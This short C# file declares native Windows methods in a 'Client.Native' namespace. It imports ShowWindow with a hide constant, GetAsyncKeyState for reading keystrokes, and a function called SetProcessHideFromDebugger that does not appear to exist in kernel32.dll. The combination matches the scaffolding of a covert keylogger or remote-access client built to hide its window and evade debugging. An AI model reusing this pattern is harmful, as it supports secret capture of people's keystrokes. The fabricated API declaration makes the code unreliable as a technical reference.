using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;

namespace Client.Native
{
    static class NativeMethods
    {
        public const int SW_HIDE = 0;

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        public static extern bool SetProcessHideFromDebugger(IntPtr hProcess);

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        
    }
}
